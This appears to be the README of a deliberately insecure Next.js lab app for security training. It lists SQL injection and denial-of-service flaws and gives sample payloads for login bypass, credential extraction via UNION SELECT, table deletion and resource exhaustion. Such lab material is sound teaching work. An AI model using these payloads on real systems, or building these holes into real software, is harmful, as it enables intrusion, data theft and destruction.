# Vulnerable Next.js Application

⚠️ **WARNING: This is a deliberately insecure application for educational purposes only!**

This application contains multiple security vulnerabilities including SQL Injection and DDoS vulnerabilities. **Do not deploy this to production or expose it to the internet.**

## Setup

1. Install dependencies:
```bash
npm install
```

2. Initialize the database:
```bash
npm run init-db
```

3. Run the development server:
```bash
npm run dev
```

4. Open [http://localhost:3000](http://localhost:3000) in your browser

## Vulnerabilities

### SQL Injection

1. **Login** (`/login`) - Direct string concatenation in authentication
2. **Search** (`/search`) - SQL injection in LIKE clauses with UNION SELECT
3. **User List** (`/users`) - SQL injection in ORDER BY and LIMIT
4. **Comments** (`/comments`) - SQL injection in INSERT statements

### DDoS Vulnerabilities

1. **Heavy Compute** - CPU exhaustion with recursive Fibonacci
2. **Memory Spike** - Memory exhaustion with large arrays
3. **Recursive Fetch** - Amplification attacks
4. **Expensive Query** - Database resource exhaustion with Cartesian products

## Example Attack Payloads

### SQL Injection

**Login Bypass:**
```
Username: admin' OR '1'='1' --
Password: anything
```

**Data Extraction:**
```
Search: test' UNION SELECT username, password FROM users --
```

**Table Deletion:**
```
Order: id; DROP TABLE users; --
```

### DDoS

**CPU Exhaustion:**
```json
POST /api/ddos/heavy-compute
{ "iterations": 999999999, "depth": 100 }
```

**Memory Exhaustion:**
```json
POST /api/ddos/memory-spike
{ "size": 999999999 }
```

**Database Exhaustion:**
```
GET /api/ddos/expensive-query?joins=100
```

## Security Notes

This application is intentionally vulnerable for:
- Security education and training
- Penetration testing practice
- Understanding common web vulnerabilities
- Security awareness demonstrations

**Never use this code in production!**

